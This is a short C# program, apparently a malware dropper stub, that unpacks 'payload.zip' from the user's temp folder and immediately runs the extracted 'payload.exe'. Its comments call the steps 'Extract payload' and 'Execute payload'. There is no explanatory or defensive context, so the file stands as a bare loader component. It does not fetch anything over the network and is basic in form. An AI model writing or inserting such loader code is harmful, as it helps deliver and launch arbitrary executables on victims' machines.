using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;

class Program
{
    static void Main()
    {
        string zipPath = Path.Combine(Path.GetTempPath(), "payload.zip");
        string extractPath = Path.Combine(Path.GetTempPath(), "payload");

        // Extract payload
        if (!Directory.Exists(extractPath))
        {
            Directory.CreateDirectory(extractPath);
        }

        using (var zipStream = new FileStream(zipPath, FileMode.Open, FileAccess.Read))
        {
            using (var archive = new ZipArchive(zipStream))
            {
                archive.ExtractToDirectory(extractPath);
            }
        }

        // Execute payload
        string payloadPath = Path.Combine(extractPath, "payload.exe");
        Process.Start(payloadPath);
    }
}
